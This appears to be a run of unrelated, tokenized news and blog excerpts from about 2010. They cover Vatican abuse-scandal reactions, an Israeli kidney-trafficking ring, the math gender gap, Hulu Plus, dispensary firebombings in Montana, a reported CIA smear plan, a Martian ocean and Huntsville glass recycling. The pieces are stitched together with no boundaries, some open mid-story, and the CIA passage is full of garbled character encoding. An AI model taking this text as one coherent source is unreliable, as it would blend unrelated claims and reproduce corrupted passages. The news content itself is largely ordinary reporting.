Meanwhile , the cardinal who oversees the Church 's 400,000 priests , has urged them to gather in St Peter 's Square in June to show the Pope their " determined rejection of the unjust attacks of which he is a victim " .
Cardinal Claudio Hummes , the prefect of the Congregation of the Clergy , wrote to priests calling on them to show " our solidarity , our support , our confidence , and our unconditional communion " .
The Pope , who celebrates his 83rd birthday on Friday , is due to visit the Mediterranean island of Malta this weekend .
A Vatican spokesman has indicated that he may have a discreet private meeting with victims of clerical abuse , some of whom have asked to meet him , but this has not been confirmed .
There has been a high incidence of reported cases of abuse in Malta , whose inhabitants are mainly Catholic , our correspondent says .

Police have uncovered a large organ - trafficking ring that made its members millions , a court cleared for publication Wednesday .
Six suspects have been arrested , among them a 62 - year old Brigadier - General ( res. )
Meir Zamir from Rishon Letzion , who received a medal of valor for the Yom Kippur War , and two attorneys .
According to the police , the ring members advertised online offering people waiting for years for a kidney transplant an alternate solution , for the price of $ 140,000 .
Other online ads made offers of $ 10,000 for kidneys .
To those who remained hesitant , the suspects allegedly offered up to $ 100,000 .
However the donors were never paid .
Police were given their first clue when a 50 - year old woman from Nazareth issued a complaint saying she had donated a kidney due to financial difficulties , for which she expected to receive $ 100,000 .
She said she was called in to undergo a series of tests and then flown to Azerbaijan with another donor , where she was relieved of her kidney .
Upon returning to Israel , she said , she asked those who had sent her for the money but never received it .
Police launched an investigation and meanwhile received another complaint , this time from an 18 - year old boy .
He said he was promised $ 80,000 and flown to the Philippines to donate his kidney .
Superintendant Aharon Galor told Ynet , " We ran an undercover investigation and were shocked by the proportions of this .
Despite the few complaints we received , we learned that there are many people willing to sell a kidney for just $ 10,000 .
These are people who have severe financial difficulties , for whom such a sum is a dream come true . "
Police say members of the ring also hid all medical reports after the transactions were completed , which made it difficult for the donors to receive accurate medical attention when afterwards they felt ill from the surgery .
" Sometimes there were even tragic consequences , when people went abroad healthy and returned to Israel sick and without the money , " Galor said .
The two attorneys involved in the case are also suspected of forging rubber stamps in order to issue false affidavits saying the donor and the receiver were relatives .

“ I would like nothing better than to be proved wrong , ” Dr. Summers told the economists , expressing the hope that gender imbalances could be rectified simply by eliminating social barriers .
But he added , “ My guess is that there are some very deep forces here that are going to be with us for a long time . ”

Dr. Summers was pilloried for even suggesting the idea , and the critics took up his challenge to refute the hypothesis .
Some have claimed he was proved wrong by recent reports of girls closing the gender gap on math scores in the United States and other countries .
But even if those reports ( which have been disputed ) are accurate , they involve closing the gap only for average math scores  not for the extreme scores that Dr. Summers was discussing .
Some scientists and advocates for gender equity have argued that the remaining gender gap in extreme scores is rapidly shrinking and will disappear .
It was called “ largely an artifact of changeable sociocultural factors ” last year by two researchers at the University of Wisconsin , Janet S. Hyde and Janet E. Mertz .
They noted evidence of the gap narrowing and concluded , “ Thus , there is every reason to believe that it will continue to narrow in the future . ”
But some of the evidence for the disappearing gender gap involved standardized tests that are n’t sufficiently difficult to make fine distinctions among the brighter students .
These tests , like the annual ones required in American public schools , are limited by what ’s called the ceiling effect :
If you ’re measuring people in a room with a six - foot ceiling , you ca n’t distinguish among the ones taller than six feet .
Now a team of psychologists at Duke University has looked at the results of tests with more headroom .
In an article in a forthcoming issue of the journal Intelligence , they analyze the test scores of students in the United States who took college admissions tests while they were still in the seventh grade .
As part of an annual talent search since 1981 , the SAT and ACT tests have been given to more than 1.6 million gifted seventh graders , with roughly equal numbers of boys and girls participating .
The Duke researchers  Jonathan Wai , Megan Cacchio , Martha Putallaz and Matthew C. Makel  focused on the extreme right tail of the distribution curve : people ranking in the top 0.01 percent of the general population , which for a seventh grader means scoring above 700 on the SAT math test .
In the early 1980s , there were 13 boys for every girl in that group , but by 1991 the gender gap had narrowed to four to one , presumably because of sociocultural factors like encouragement and instruction in math offered to girls .
Since then , however , the math gender gap has n’t narrowed , despite the continuing programs to encourage girls .
The Duke researchers report that there are still four boys for every girl at the extreme right tail of the scores for the SAT math test .
The boy - girl ratio has also remained fairly constant , at about three to one , at the right tail of the ACT tests of both math and science reasoning .
Among the 19 students who got a perfect score on the ACT science test in the past two decades , 18 were boys .
Designed by the talented Igor Chak , the bike above is a modern redesign of the iconic though little known ( outside of Russia ) 1929 IZH - 1 motorcycle .
The concept uses an innovative 60 kw brushless electric motor built into the rear wheel hub to provide a hybrid final drive and uses lithium - sulfur batteries .
Interestingly , lithium - sulphur batteries are lighter , have a higher energy density than lithium -ion and are cheaper to produce due to the relatively inexpensive nature of sulphur .
The IZH stands for Izhevsk Mechanical Works , a company most widely known for the production of the timeless Kalashnikov Assault Rifle ( the AK - 47 ) .
IZH also produced small cars and a number of motorcycles , hence Igor Chak ’s decision to resurrect the motorcycle badge with the hybrid concept .
The bike features a number of fascinating technological innovations beyond the hybrid drive train , it has dual airbags ( see picture below ) a front crumple zone , ultra light weight plastic body panels and a wiring loom built into the frame .
A unique proximity radar system is capable of automatically braking the bike if the car in front slows or stops unexpectedly , Chak has also integrated a front facing camera with night vision and augmented reality functionality .
In short , this bike is a fast forward , showing us the vehicle technology we ’ll be interacting with in 5 - 15 years time .
The chance of IZH picking up this concept and putting it into production is rather minimal , however Chak has shown extraordinary and remarkably forward thinking design talent .
We can only hope that KTM , Ducati , Aprilla , BMW or some other large manufacturer picks up the concept and runs with it , at the very least it would be great to see certain elements of the design make it into production .

From an interview to air tomorrow this morning with Matt Lauer on NBC's Today Show .
" I was down there a month ago , before most of these talkin ' heads were even paying attention to the gulf .
A month ago ... I was meeting with fishermen down there , standin ' in the rain talking about what a potential crisis this could be .
And I do n't sit around just talking to experts because this is a college seminar , we talk to these folks because they potentially ... have the best answers , so I know whose ass to kick " .
And here is the complete video , up now at the MSNBC site .
This part , with Lauer 's lead in , begins at about the 4:30 mark .
Hulu has finally announced its long - rumored subscription service , Hulu Plus , though it wo n't be ad - free as some expected .
Instead ,
Hulu is treating the new service as an extension of the Hulu website for TV - lovers — those who want to take Hulu 's content outside of the browser sandbox and onto their mobile devices or , even crazier , onto their TVs .
For $ 9.99 per month , Hulu Plus subscribers can watch streaming content on Samsung Internet - connected TVs and Blu-ray players , and on the iPad , iPhone 4 or 3GS , or third - generation iPod touch .
" [ T ] his is just the first step in our mission to bring you TV wherever you are , " Hulu CEO Jason Kilar wrote on the company 's blog .
" We are already hard at work on porting Hulu Plus to other devices and platforms , with PlayStation 3 coming soon .
But that ’s a story for another day . "
Kilar did not specifically mention it in his blog post , but Microsoft confirmed to Ars that Hulu Plus would be available on the Xbox 360 for the launch as well .
The Xbox 360 will offer Hulu Plus subscribers " controller - free navigation with Kinect and Xbox Live Parties so you can watch with friends no matter where they are . "
In addition to the expanded list of devices you can watch Hulu content on , Hulu Plus subscribers will also get access to full ( and back ) seasons of some of their favorite shows .
( Many TV shows already offer this for free through the Hulu website , but many others do not — back seasons are a near impossibility when it comes to most of the shows I watch .
Even trying to watch a show that aired two weeks ago can be a challenge sometimes . )
The Hulu Plus teaser page has a list of shows that will be available , including all six seasons of The Office , all nine seasons of The X - Files , and 118 other full seasons .
Hulu goes cable
Hulu confirmed another rumor that had been swirling around about Hulu Plus : the company will not be ditching ads for the premium service .
" [ W ]e believe that any lasting solution to the challenge of making TV show discovery and viewing dramatically easier has to work for all three of our customers , and those are our end users , our advertisers , and our content suppliers , " wrote Kilar .
" For our advertisers , who allow us to keep our Hulu Plus price low with the support of ad revenue , we offer one of the world ’s most effective advertising platforms , with the ability to speak effectively to users across a variety of devices , anywhere they happen to be . "
While this may be a turnoff for some potential subscribers , it fits with the cable industry 's much - loved " dual stream " revenue model of subscriptions plus ads .
For now , Hulu Plus is only open to a limited number of Hulu users , though you can request an invitation on the teaser page ( Kilar says the company will send out invitations in waves over the coming months , so it may be a while after you submit the request . )
When we get access , we 'll post a full hands - on to let you know what the service is like .
( CNN ) --
The Billings , Montana , City Council will take up the issue of regulating medical marijuana on Monday night in a meeting expected to be intense in the wake of the firebombings of two of the city 's medical marijuana storefronts in the last two days .
The southern Montana city 's dispensaries legally provide marijuana to medical patients who use it for maladies from glaucoma to nausea to lack of appetite .
In the latest incidents , the phrase " Not in our town " was spray - painted on the businesses , police say .
Police Sgt. Kevin Iffland said Big Sky Patient Care was hit early Sunday morning and Montana Therapeutics was the target early Monday .
Both had a rock thrown through the front door , followed by a Molotov cocktail .
In both cases , Iffland said , the fire was put out swiftly and damage was not extensive .
Iffland said Billings police are working with the U.S. Bureau of Alcohol , Tobacco , Firearms and Explosives and that the two firebombs are being handled as felony arsons carrying sentences of up to 20 years in prison and a $ 50,000 fine .
The attacks on the storefronts come as the Billings City Council considers a moratorium on licensing new dispensaries while it works up a regulatory ordinance .
Sixty - two percent of Montanans voted in 2004 to allow caregivers to grow marijuana for qualified patients , but the state law said nothing about distribution .
In that absence , municipalities and county governments began licensing the establishments on their own .
But , Iffland said , Billings was ill - prepared for the number of applications and has very little regulation in place .
Billings , he said , is a town of about 100,000 and has had nearly 90 applications for medical marijuana storefronts -- and some residents are angry .
He fully expected a heated council meeting .
Meanwhile , investigators are still reviewing evidence in the firebombings and are working with one of the businesses that has surveillance video but is reluctant to hand over the tape because of privacy concerns .
While the investigation is ongoing , police have stepped up patrols in the areas where the medical marijuana storefronts are located , Iffland said .
Image caption Criminals are trying to intimidate the relatives , officials say
The families of 67 miners killed in a recent accident in Russia are to get 24 - hour police protection after reportedly being targeted by criminals .
The gangs are allegedly trying to force the families in central Siberia to hand over thousands of dollars they have received as compensation money .
Twenty - three miners are still missing after the blasts at the Raspadskaya mine on 9 May .
It was one of the worst accidents in recent years .
Opposition warning
It has already led to angry protests on the streets in the local town - with the main railway line blocked for several hours until riot police intervened .
Now - according to the authorities - the widows of the miners killed in the accident are being visited by criminal gangs demanding a large part of the compensation money .
One woman is quoted as saying the gangsters threatened to burn down her house and attack her children if she did not hand over the cash .
In response , the local governor has ordered that each of the families receive police protection .
He has also called for the criminals to be tracked down and punished .
But an opposition politician has warned that the local authorities may be using this issue as an excuse to keep watch over the miners ' families to prevent any further demonstrations .
Both the local and national authorities have reasons to be fearful of a large protest movement developing amongst the workforce in the mines .
In the late 1990s , miners marched to Moscow - directly confronting the government with their grievances .
EPA Contest Seeks Videos Promoting Government Regulations ( CNSNews.com )
President Obama ’s Environmental Protection Agency is encouraging the public to create video advertisements that explain why federal regulations are “ important to everyone . ”
The contest , which ends May 17 , will award $ 2,500 to the makers of the video that best explains why federal regulations are good and how ordinary citizens can become more involved in making regulations .
The videos must be posted on YouTube and can be no more than 60 - 90 seconds in length .
In the current contest , each video must include the slogan “ Let your voice be heard , ” and it must direct viewers to the government ’s regulatory website www.Regulations.gov.
The winning video will then be used by the entire federal government to promote the regulatory process and enhance the public ’s participation in it .
The regulations.gov site not only highlights the video contest , but has lots of other useful information .
You ’ll find a searchable database of all documents on their site .
It ’s possible to find out how many regulations there are about any subject .
I ’ve always thought there was a plethora of federal regulations , but I had no way to quantify these regulations , until now .
Here are some random keyword searches from the regulations site , and the resulting number of rule matches .
Windows ( 1303 )
Dirt ( 145 )
Hair ( 132 )
Schools ( 2437 )
But wait , there ’s more !
The site claims on its front page , “ On average , federal agencies and departments issue nearly 8,000 regulations per year . ' ”
The site also has newly posted regulations , and the numbers in there do n’t match up with the front page .
For today – April 19th , 2010 , 74 regulations were posted , and in the last year there were 23,867 regulations posted .
Can you now see why the federal government needs your help ?
With roughly twenty - four thousand regulations in the last year , they need all the help they can get to thoroughly promote them !
The site also allows you to comment on rules , but only rules that are open to comments .
In the 145 rules on dirt , only two are open for comment .
I ’d post a comment , but I ’m fairly sure a comment thanking them for exposing just how bloated and overbearing such regulations are would not be appreciated .
Soon there will be other contests concerning government regulations , but they wo n’t be coming from the EPA .
This video promotion is an easy setup for limited government people to hold contests of their own .
How about a find things the government does not regulate contest ?
I tried searching for something not regulated , but even flatulence was mentioned in a proposed rule .
How about an award for worst government PR campaign ?
The EPA should at least be a nominee for that award .
A vast ocean chock - full of microbes may have once covered more than a third of Mars 's surface , scientists say .
The new evidence , from an analysis of dried - up Mars river deltas , adds to growing signs the red planet was once wet .
On Earth , river deltas all lie at more or less the same elevation and reflect the current sea level .
In fact , by estimating the elevations of ancient deltas , scientists can reconstruct how sea levels have changed over time .
Brian Hynek and Gaetano Di Achille of the University of Colorado at Boulder applied this thinking to Mars .
By determining the elevation of 52 desiccated deltas on Mars , the scientists found that 17 of the deltas lie at approximately the same elevation .
" If there was an ocean on Mars , then the deltas should be at a constant elevation — or at least the majority of them , and that is what we found , " Hynek said .
The deltas would have ringed an ocean in Mars 's northern hemisphere that existed about 3.5 to 3.7 billion years ago .
( See Mars pictures . )
The ocean lasted for at least several hundred million years — about the time it would have taken for all the deltas to form , Hynek said .
Ancient Mars Had Shallow Ocean
Scientists first proposed the idea of an ancient Martian ocean in the 1980s after spotting potential beach ridges and other features in images taken by NASA 's Viking probes .
Some , but not all , of that early evidence was later discounted with more precise mapping data from other Mars missions , and the debate has continued .
If it existed , Mars 's ancient ocean was not very big or deep by Earth standards .
Its volume was only about one - tenth that of Earth 's oceans , and it would have only been about 5.5 kilometers ( 3.4 miles ) deep on average .
By contrast , " the bottom of the Atlantic [ Ocean ] is roughly 5 kilometers [ 3.1 miles ] deep across a lot of it , but in the Pacific you can get some very deep trenches that are a quite a bit deeper , " said Hynek , whose research appeared in the June 13 issue of the journal Nature Geoscience .
Mars Had Earth - like Atmosphere ?
An ancient ocean on Mars would mean the planet once had a thick atmosphere and a hydrological cycle similar to that of Earth .
" If Mars had an ocean , it must have had clouds and rain , snow in the highlands , ice caps forming , a groundwater system , and all of these things that we have here on Earth , " Hynek said .
And where water flowed , life could have arisen .
( Read more about the search for life on Mars . )
" Life on Earth started in the oceans and stayed in the oceans for billions of years , " Hynek said .
" If Mars had oceans for even a couple hundred million years , it gives me more hope that we 'll find evidence of past microbial life on Mars . "
No " Final Word " on Mars Ocean
The new study strengthens the argument for an ancient Martian ocean , but it is " unlikely to give the final word on the [ Mars ] ocean debate , since it is such indirect reasoning , " said James Head III , a planetary scientist at Brown University in Rhode Island who was not involved in the study .
In addition , Taylor Perron , a geologist at the Massachusetts Institute of Technology , said the new study still leaves some issues unresolved .
For example , why were the elevations of all the deltas studied not at the same level ?
" The variability in the elevations of the deltas they mapped allows for the possibility that the deltas do not record a single , level sea surface , " Perron wrote in an email .
Is flatulence ruining your love life ?
My friends , look no further than the Better Marriage Blanket , a fart - absorbing wünderspread that means you 'll never again have to blame it on the dog .
This is a real thing !

Image caption Syncrude Canada was found guilty of failing to prevent a hazardous substance from coming into contact with wildlife
Oil giant Syncrude Canada has been found guilty of causing the deaths of 1,600 ducks that landed in a toxic settling pond in northern Alberta .
The ducks died after being coated in a toxic lather when they landed in the waste pond in April 2008 .
Judge Ken Tjosvold said the oil company did not take the appropriate steps to deter the birds from the area .
Mr Tjosvold said the company had cut back " substantially on a number of deterrents " in recent years .
Syncrude Canada was found guilty of failing to prevent a hazardous substance from coming into contact with wildlife , and of depositing a substance harmful to migratory birds .
The company now stands to pay a fine of up to CAN $ 800,000 ( £ 515,000 ) .
" We are definitely pleased with this verdict , but we wish it would have come 30 years earlier so we did n't have the 170 kilometers of toxic waste to deal with , " said Sheila Muxlow with the local environmental group Sierra Club Prairie .
Syncrude spokeswoman Cheryl Robb said deterence measures now operated all year round .
" We 're disappointed , " Ms Robb said of the verdict .
" We were very concerned that the use of these charges would have had serious ramifications on Canada 's mining industry . "

Every hunter hopes that their dog will never have reason to enter into a dog fight .
In fact , many dog owners would list reasons why their dog would never do such a thing .
However , even highly trained dogs can become emotional or get pulled in to a squabble .
It is quite possible that your dog will fight for an acceptable reason .
Dogs can fight out of jealousy , poor socialization , improper breeding , or a desire for dominance .
But they will also fight when they are in fear or pain , or they are defending themselves against some form of attack .
What if , for example , your perfectly trained , mild - mannered , wonderfully loyal companion is at your side performing well , when you both encounter a dog that has not been perfectly trained , is not mild - mannered or loyal , and is sick , in pain , or tired ?
Then this unpredictable dog approaches your dog and becomes agitated or violent .
Even if your dog is perfect in every way , your dog will fight , if for no other reason than to defend himself .
And , even though this is your loyal companion , your interference in this struggle can easily end in your own injury .
During a dog fight , you are unrecognizable to your dog as his provider and friend .
Instead , you are an obstacle to be removed so that he can get back to the task at hand .
It is important to recognize if the fight truly requires your peace - making interference .
Are the dogs truly fighting or are they simply growling and threatening one another ?
If they are just posturing in an attempt to gain superiority or dominance , it is likely that one will submit and the other will accept the surrender .
However , if the dogs are truly fighting and neither one appears ready to back down , it may require your assistance .
In your attempts to separate the dogs , do not take hold of either dog ’s muzzle ( it is quite probable you will be bitten ) .
Do not yell , as this can often elevate their excitement .
Do not insert yourself between the dogs , as you will become a target of their violence .
Also , do not attempt to break up the fight by hitting the dogs with objects .
This will increase their excitement and add pain to an already sticky situation .
There are two effective ways to bring the fight to an end .
The first one involves spraying or throwing water into the dogs ’ ears .
This allows enough of a surprise and pause that you can intervene and pull them apart .
The second method depends entirely on the presence of both owners .
Both you and the other dog ’s owner ( or another willing bystander ) grabs a dog by the hindquarters and walks them backwards .
Ideally , you should walk in a circle so that the dog is a bit out of balance .
Once the dogs are separate , they must stay apart for at least several hours .
In most cases this will require that the dogs be tied or crated .

Sven Olaf Kamphuis runs CB3ROB , the German ISP that helps host The Pirate Bay and has just been hit with an injunction by a Hamburg court .
Unless CB3ROB stops hosting the site , it faces massive financial penalties , and Kamphuis even risks jail time .
The Motion Picture Association is already issuing press releases about the news , but Kamphuis tells
Ars that he has n't even been notified about the injunction — and he says " it 's questionable if they even obtained it legally " without having a full court hearing .
Regardless of the injunction 's legality , Kamphuis ' views on it remain the same : it 's ridiculous .
" The Pirate Bay is a search engine for the BitTorrent protocol , " he tells Ars , " and therefore fully legit , and if its users do n't have a distribution license for any content that would require such , guess who 's to blame for not selling it to them in the first place , but preferring old distribution channels instead , which pollute the environment and constitute unfair competition . "
Big media companies like Disney , which is run by " clueless idiots , " might be able to make more money by distributing encrypted content through sites like The Pirate Bay , Kamphuis believes .
By going after a hosting service , Kamphuis also argues that Hollywood is shooting itself in the foot .
" They may be unaware of this , but the provider protection , which requires carriers to relay traffic from and to any connected party , is the only thing that keeps Disney and Paramount on the Internet in the first place .
" We do most certainly know how to deal with hostile entities .
Undermining the provider immunity , therefore , may not be the best choice of their management , as nobody in the internet industry actually still likes them .
( Goodbye , Disney investor portal . ) "
His solution to the whole problem is for Europeans to start voting for the various national Pirate Parties , in order to " help put those dinosaurs out of their misery , and stop them from harassing all kinds of new business models and the general population because of their ' all important movies , ' which nobody asked them to make in the first place .

I 'm sorry to hear that the university 's $ 750 million endowment has fallen in value to $ 500 million because of the recession and because your bank died .
I 'm also sorry to hear that you 're dealing with declining enrollment due to the fact that middle - class families are no longer willing or able to bet their homes on a $ 45,000 - a- year higher education for their children .
I really am .
So , what I want to know is , why are you wasting money on glossy fundraising brochures full of meaningless synonyms for the word " Excellence " ?
And , why are you sending them to ME ?
Yes , I know that I got a master 's degree at your fine institution , but that master 's degree has n't done jack shit for me since I got it !
I have been unemployed for the past TWO YEARS and I am now a professional resume - submitter , sending out dozens of resumes a month to employers , and the degree I received in your hallowed halls is at the TOP OF IT and it does n't do a fucking thing .
You know , maybe if you wanted a little bit of money from me ( and these days you 'd get about $ 3 ) maybe you should send me a fancy color brochure admitting your role in the bubble economics that got us all in to this mess .
For example , since 1987 , higher education expenses have gone up 450 percent , while personal income in this country has gone up 87 percent , making tuition IMPOSSIBLE to afford without special financing .
But , during this time , you were thriving because people could come up with the cash in two ways : 1 .
Get a home equity loan and use the inflated value of their house to pay for their kid to get drunk and / or raped at your school and then lose the house when the market crashed .
2 . Get a federal loan .
HAD IT OCCURRED TO YOU THAT NEITHER OF THESE SOURCES OF MONEY ACTUALLY EXIST ?
THAT IT WAS BEING MANUFACTURED BECAUSE YOU MADE PEOPLE THINK THAT ONE OF YOUR DEGREES WAS NECESSARY TO CLIMB TO THE TOP OF THE BUBBLE ?
Oh yes , federal loans .
I 've got $ 40,000 of those , which are in " forebearance " right now because I 'm unemployed , meaning that the feds are paying the interest for a while , which is convenient for me , but not for our government which is now owned by China .
You know , the idea behind federal loans was that it would allow more students to attend your university , not let you INFLATE your tuition to obscene levels !
I mean , what the fuck were you spending the $ 16,000 per semester on , anyway ?
I was in a public policy program , so that meant we got to sit in classrooms and listen to Professor God up at the front of the lecture hall glorify Himself and Creation as He saw it and talk about how much smarter he was than anyone else and how much he 'd learned at MIT and the RAND Corporation .
Really , that 's about all you did for us -- gave us a lecture hall , gave us an arrogant bastard to listen to , and gave us a room full of computers we could use sometimes , and you gave us a degree that employers look at and say " This guy knows how to write reports .
Amusing . "
And I will be paying for this privilege until I am 51 years old .
So I 'm sorry that the economy 's been rough on you .
Maybe , if you wanted to save a little money , you could stop printing and sending brochures to my parents ' house ( oh yeah , that 's where I live because I can't afford rent on ANYTHING ) .
And , maybe I 'll donate a little bit of money to you in 2030 , when I get the loans for your imaginary education PAID OFF !
Sincerely yours , Alumnus

In a must - read / listen NPR report , the ABA ’s senior vice president for science policy , Maureen Storey , made the claim that soda should play a crucial role in children ’s hydration needs :
… Children who have been exercising may not drink enough water to get back to the hydration point that they need to be at .
So with a little bit of flavoring and a little bit of sweetness , they will drink enough then to get back to where they need to be .
Are you kidding ?
Kids do n’t drink enough water , so they should drink soda to make sure they do n’t get dehydrated ?
Have these people no shame ?
Oh , and , by the way , Storey wanted to make sure we realize that soda is positively healthy because it ’s 99 % water , and water is an important nutrient .
Anyone else spot the egregious circular logic at work there ?
If only NPR host Michelle Norris had expressed a bit more incredulity .
This stuff does n’t deserve to be taken seriously .
A little - noticed blog post by a veteran intelligence reporter averred Tuesday that the CIA ’s Iraq Operations Group weighed a plan prior to the 2003 Iraq invasion that sought to discredit Saddam Hussein by portraying him as gay .
According to Jeff Stein , a longtime intelligence reporter who first revealed that FBI officials had eavesdropped on a sitting Democratic congresswoman , the CIA ’s Iraq Operations Group considered creating a video that would the then - Iraqi leader having intercourse with a teenage boy .

Ã¢â‚ ¬Å“ It would look like it was taken by a hidden camera , Ã¢â‚ ¬Â a former CIA official purportedly told Stein .
Ã¢â‚ ¬Å“ Very grainy , like it was a secret videotaping of a sex session .
Ã¢â‚¬Â
The CIA would have then Ã¢â‚ ¬ Å“ flood [ed ]
Iraq with the videos , Ã¢â‚ ¬Â the official added .
A third former CIA official said that the plan was shot down , in part , because others in the agency thought that claiming Saddam had sex with boys would do little to undermine him .
Ã¢â‚ ¬Å“ Saddam playing with boys would have no resonance in the Middle East — nobody cares , Ã¢â‚ ¬Â another purported CIA official is quoted as saying .
Ã¢â‚ ¬Å“ Trying to mount such a campaign would show a total misunderstanding of the target .
We always mistake our own taboos as universal when , in fact , they are just our taboos .
Ã¢â‚¬Â
A current U.S. official told Stein he could n’t confirm or deny the former CIA employees ’ claims .

“ While I ca n’t confirm these accounts , if these ideas were ever floated by anyone at any time , they clearly did n’t go anywhere , ” the official told Stein .
Stein notes , however , that the CIA did make a video in which a fake Osama Bin Laden enjoys a campfire and the company of his associates while bragging about their juvenile paramours .
The agency actually did make a video purporting to show Osama bin Laden and his cronies sitting around a campfire swigging bottles of liquor and savoring their conquests with boys , one of the former CIA officers recalled , chuckling at the memory .
The actors were drawn from Ã¢â‚ ¬Å“ some of us darker - skinned employees , Ã¢â‚ ¬Â  he said .
Eventually , Ã¢â‚ ¬Å “ things ground to a halt , Ã¢â‚ ¬Â  the other former officer said , because no one could come to agreement on the projects .
They also faced strong opposition from James Pavitt , then head of the agencyÃ¢â‚¬â „ ¢s Operations Division , and his deputy , Hugh Turner , who Ã¢â‚ ¬ Å “ kept throwing darts at it .
Ã¢â‚¬Â 

Fundamentalists in Iraq have shown disdain for their gay compatriots since Saddam ’s fall .
In some cases , according to human rights activists , they ’ve resorted to grotesque violence .
The television news agency Al Arabiya reported last year that a prominent Iraqi human rights activist asserted that some men have died after gruesome anal torture .

“ A prominent Iraqi human rights activist says that Iraqi militia have deployed a painful form of torture against homosexuals by closing their anuses using “ Iranian gum , Ã¢â‚ ¬Â  the network said .
“ Yanar Mohammad told Alarabiya.net that , Ã¢â‚ ¬Å“ Iraqi militias have deployed an unprecedented form of torture against homosexuals by using a very strong glue that will close their anus .
Ã¢â‚¬Â 
“ According to her , ” the report added , “ the new substance ‘ is known as the American hum , which is an Iranian - manufactured glue that if applied to the skin , sticks to it and can only be removed by surgery .
After they glue the anuses of homosexuals , they give them a drink that causes diarrhea .
Since the anus is closed , the diarrhea causes death .
Videos of this form of torture are being distributed on mobile cellphones in Iraq . ' ”

Pope Benedict XVI says the clerical child abuse scandal shows that the greatest threat to Catholicism comes from " sin within " the Church .
He made his comments in response to a question while en route to Portugal .
Critics have previously accused the Vatican of attempting to blame the media and the Church 's opponents for the escalation of the scandal .
But the Pope made clear its origin came from within the Church itself , and said forgiveness " does not replace justice " .
' Need for penance ' " Today we see in a truly terrifying way that the greatest persecution of the Church does not come from outside enemies , but is born of sin within the Church , " the pontiff told reporters on a plane bound for Portugal .
His comments were his most direct response to media questions , and some of his strongest words yet on the abuse scandal , says BBC Vatican correspondent David Willey , who is travelling with the Pope .
Benedict said the Church has " a very deep need " to acknowledge that it must do penance for its sins and " accept purification " .
However , he added that forgiveness should not be a substitute for justice .
There has been a wave of allegations in the past few months that Church authorities in Europe and North and South America failed to deal properly with priests accused of child sex abuse , sometimes just moving them to new parishes where more children were put at risk .
The Pope himself has been accused of being part of a culture of secrecy , and of not taking strong enough steps against paedophiles when he had that responsibility as a cardinal in Rome .
However , his supporters say he has been the most pro-active pope yet in confronting abuse .
' Spiritual crisis '
The Pope later on Tuesday landed at Lisbon , the capital , despite fears that the volcanic ash cloud affecting flights in the region would disrupt his plans .
Portugal is the site of one of Europe 's most popular shrines , at Fatima He celebrated an open - air Mass before a crowd of about 80,000 people in the city .
Benedict told the crowd that nothing could destroy the Catholic Church .
" The resurrection of Christ assures us that no adverse power will ever be able to destroy the Church , " the Pope said during his address the banks of the Tagus river .
During his four - day trip the pontiff was also due to celebrate Mass at the Catholic shrine of Fatima , and in Oporto .
Church officials say he will address Europe 's spiritual and economic crisis .
Although nearly 90 % of people in Portugal are reported to be Catholics , only about 20 % attend Mass regularly , the BBC's Vatican correspondent , David Willey , reports from Lisbon .
Pope Benedict intended to tell the Portuguese to seek solace in their faith to relieve the gloom of financial hardship , he says .
Carlos Azevedo , the auxiliary bishop of Lisbon and the co-ordinator of the papal visit , said on Monday that the pontiff will speak about " the joy of faith and hope " .
" The moral values guiding the economy and politics show that there is a spiritual crisis , " he said .
Portugal has been one of the countries worst affected by the economic problems troubling many European states .
The highlight of the trip is a visit to Fatima on Wednesday and Thursday , where a giant outdoor Mass has been planned for as many as 500,000 people .
Fatima is one of the main sites of Christian pilgrimage in Europe .
The Pope will be marking the anniversary of the day in 1917 when three Portuguese shepherd children reported having visions of the Virgin Mary in Fatima .

HUNTSVILLE , AL --
For six years , the Lowe Mill arts center took great pride in lugging its empty glass bottles to Allied Waste 's Huntsville Recyclery off Triana Boulevard .
Assistant Manager Grace Billiter did n't mind the smelly , heavy work because keeping the bottles out of the landfill was good for the planet .
She assumed they were being turned into new , eco-friendly products .
But Allied officials confirmed last week that glass hauled to the recyclery by green - minded residents - about two tons every month - has not been recycled .
At least not in the traditional sense .
Instead , it is burned with other garbage in the city incinerator .
The ash is then used as landfill cover .
" People have been going through tremendous effort to recycle their glass , " Billiter said Thursday , " and it 's all for naught because it 's just ending up in the landfill .
We could have thrown it into the trash just as easily . "
" It would have been nice to know that years ago . "
On April 22 - Earth Day - Billiter and several friends who discovered what was happening took their concerns to the Huntsville City Council .
Council President Mark Russell has asked Doc Holladay , executive director of the city 's Solid Waste Disposal Authority , to explain the glass recycling situation at Thursday 's council meeting .
The authority pays Allied Waste $ 2.3 million a year to pick up , sort and find markets for glass , discarded newspapers and magazines , empty milk jugs and other items recycled by Madison County residents .
" The council , I believe , wants to get a glass recycling program in Huntsville , " Russell said Wednesday .
" We 're going to use this as an opportunity to discuss that . "
Allied on Thursday defended its practice of burning glass , saying the steam is used to heat and cool Redstone Arsenal buildings .
" It 's a form of recycling , " said Blaine Ellzey , an operation manager in the company 's Huntsville office .
But Allied 's general manager for this area , Bill Brinkley , said the company wants to get back to conventional glass recycling .
Going forward , glass brought to the recyclery will be shipped to a Strategic Materials factory in suburban Atlanta and turned into recycled glass products , he said .
" It 's the right thing to do , " Brinkley told The Times .
Thomas Moss , who joined Billiter at the council meeting last month , said he is " bitterly frustrated " that no one bothered to inform the public when Allied started burning the glass .
Day after day , people drive to the recyclery on A Cleaner Way and deposit their empty bottles into separate bins for clear , green and brown glass .
" It 's insulting that my personal effort and the effort of others has been disrespected , " Moss said .
" We should have a green , state - of - the - art recycling service in Huntsville .
" Instead , we have lip service . "
Beginnings
In 1990 , Huntsville became one of the first cities in Alabama to launch a household recycling program .
Just toss your used glass in the handy plastic bin and place it by the curb .
Glass was removed from the curbside program in 1995 , but Allied ( previously known as BFI ) gave the strong impression that bottles brought to its recyclery would still be recycled .
Many other cities also started and later quit recycling glass door - to - door .
The inevitable broken bottles pose a hazard to recycling center workers who have to sort the glass by hand ; the jagged shards can also contaminate other recyclables .
Today , Athens is the only North Alabama city still recycling glass at the curb .
Bill Wojciechowski , who manages the Athens - Limestone Recycling Center , said he ships about 40,000 pounds of used glass to Strategic Materials in College Park , Ga. , about once every six weeks .
" We 're in it because we love the environment and keeping items out of the landfill , " Wojciechowski said Wednesday .
" We 've simply put the energy into creating a program for it . "
Brinkley said Allied made efforts in the past to drive glass from Huntsville to Atlanta to be recycled .
But it became impractical because of falling glass prices and rising transportation costs , he said , noting that the company is not contractually obligated to haul glass out of the area to be recycled .
At some point , Allied chose to burn the glass rather than truck it four hours to Georgia .
" I can't speak to when this happened or why , " said Brinkley , who moved here from Jacksonville , Fla. , two months ago .
